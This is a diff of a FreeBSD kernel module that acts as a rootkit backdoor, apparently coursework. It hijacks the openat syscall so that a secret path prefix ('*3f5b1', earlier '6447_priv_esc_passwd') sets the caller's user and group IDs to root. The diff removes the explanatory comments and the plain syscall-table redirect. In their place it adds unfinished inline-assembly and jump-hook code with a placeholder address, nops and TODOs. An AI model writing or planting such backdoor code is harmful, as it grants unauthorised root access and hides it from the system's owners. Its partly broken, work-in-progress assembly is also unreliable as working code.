@@ -1,75 +1,140 @@
-/*
- * Kernel module that hijacks a pre-existing syscall.
- * Hijacked syscall will act normally unless a specific arg is given,
- * which escalates the process to root.
- */
 #include <sys/param.h>
 #include <sys/module.h>
 #include <sys/kernel.h>
 #include <sys/systm.h>
-#include <sys/proc.h>       /* thread, proc */
-#include <sys/pcpu.h>       /* curthread */
-#include <sys/sysent.h>     /* sysentvec, sysent, sy_call_t */
+#include <sys/proc.h>
+#include <sys/pcpu.h>
+#include <sys/sysent.h>
 
-/* Escalate the current thread and its associated process to root. */
 static void
 escalate(struct thread *td) {
 
-    td->td_ucred->cr_uid =          /* effective user id */
-        td->td_ucred->cr_ruid =     /* real user id */
-        td->td_ucred->cr_svuid =    /* saved user id */
-        td->td_ucred->cr_gid =      /* effective group id */
-        td->td_ucred->cr_rgid =     /* real group id */
-        td->td_ucred->cr_svgid =    /* saved group id */
-        0u;                         /* root id */
+    td->td_ucred->cr_uid =
+        td->td_ucred->cr_ruid =
+        td->td_ucred->cr_svuid =
+        td->td_ucred->cr_gid =
+        td->td_ucred->cr_rgid =
+        td->td_ucred->cr_svgid =
+        0u;
 }
 
-/* The system call's arguments. */
-struct sc_args {
-    int fd;
-    char *path;
-    int flag;
-    mode_t mode;
-};
+static int
+__attribute__ ((noinline)) dummyret(struct thread *td) {
+    return (td == (void *) NULL) ? 1 : 0;
+}
 
-/* Function pointer to the old syscall function that is being hijacked. */
-static sy_call_t *old_sy_call = NULL;
+static void
+__attribute__ ((noinline)) get_pc_edi() {
+    __asm__ volatile ("mov 4(%esp), %edi");
+}
 
-/* New syscall that will be written to the hijack victim's syscall slot. */
 static int
 new_sy_call(struct thread *td, void *syscall_args) {
 
-    int retval = (*old_sy_call)(td, syscall_args);
-    /* syscall_args may be mapped to invalid addresses if the retval != 0. */
-    if (retval != 0) {
-        return (retval);
-    }
+    __asm__ volatile ("push %edi");
 
-    struct sc_args *args = (struct sc_args *) syscall_args;
+    struct sc_args {
+        int fd;
+        char *path;
+        int flag;
+        mode_t mode;
+    };
 
-#define PRIV_ESC_PASSWD "6447_priv_esc_passwd"
-    if (strstr(args->path, PRIV_ESC_PASSWD) != NULL) {
-        escalate(td);
-    }
+    struct sc_args *args;
+    char * str;
 
-    return (retval);
+    get_pc_edi();
+    __asm__ volatile ("addl $36, %edi"); // TODO get exact value to add
+    __asm__ volatile ("push %edi"); // push return address
+
+    // sy_call_t *openat_sy_call = (sy_call_t *)(0xc0c42820 + 5);                 
+    // retval = (*openat_sy_call)(td, syscall_args);
+    int retval = dummyret(td);
+
+    __asm__ volatile ("push %ebp");
+    __asm__ volatile ("mov  %esp, %ebp");
+    __asm__ volatile ("push %edi");
+    __asm__ volatile ("push %esi");
+    __asm__ volatile ("movl -0x38(%ebp), %edi");
+
+    // TODO insert jmp to old syscall + 8,
+    // when old sys call returns, its retval will be in eax.
+
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+
+    if (retval != 0) {                                                        
+        goto returnlabel;
+    }                                                                         
+
+    args = (struct sc_args *) syscall_args;                   
+    str = args->path;                                                  
+
+    if (str[0] == '*' &&                                                      
+        str[1] == '3' &&                                                      
+        str[2] == 'f' &&                                                      
+        str[3] == '5' &&                                                      
+        str[4] == 'b' &&                                                      
+        str[5] == '1') {                                                      
+        escalate(td);                                                         
+    }                                                                         
+
+returnlabel:
+    __asm__ volatile ("pop %edi");
+    return (retval);                                                          
 }
 
-/* The function called at load/unload. */
+static void
+p32(uint8_t bytes[], void *addr) {
+    uint32_t addr32 = (uint32_t) addr;
+    bytes[0] = addr32 & 0xff;
+    bytes[1] = (addr32 >> 8) & 0xff;
+    bytes[2] = (addr32 >> 16) & 0xff;
+    bytes[3] = (addr32 >> 24) & 0xff;
+}
+
 static int
 load(struct module *module, int cmd, void *arg) {
 
     switch (cmd) {
 
-    case MOD_LOAD:
+    case MOD_LOAD: {
 
-/* 499 AUE_OPENAT_RWTC STD { int openat(int fd, char *path, int flag, mode_t mode); } */
-#define HIJACKED_SYSCALL 499
-        /* record the old syscall. */
-        old_sy_call = curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call;
+        sy_call_t *old_sy_call = curthread->td_proc->p_sysent->sv_table[499].sy_call;
+
+        uint8_t jmphook[8];
+        jmphook[0] = 0xea;
+        p32(&(jmphook[1]), (void *)0xaabbccdd);
+        jmphook[5] = 0x0;
+        jmphook[6] = 0x0;
+        jmphook[7] = 0x90;
+
+        printf("\n%x %x %x %x %x %x %x %x\n", jmphook[0], jmphook[1], jmphook[2], jmphook[3], jmphook[4], jmphook[5], jmphook[6], jmphook[7]);
+        printf("%p\n", old_sy_call);
+        printf("%p\n", new_sy_call);
+
         /* redirect the entry to point to the new syscall handler. */
-        curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
+        // curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
+
         break;
+    }
 
     default:
         break;
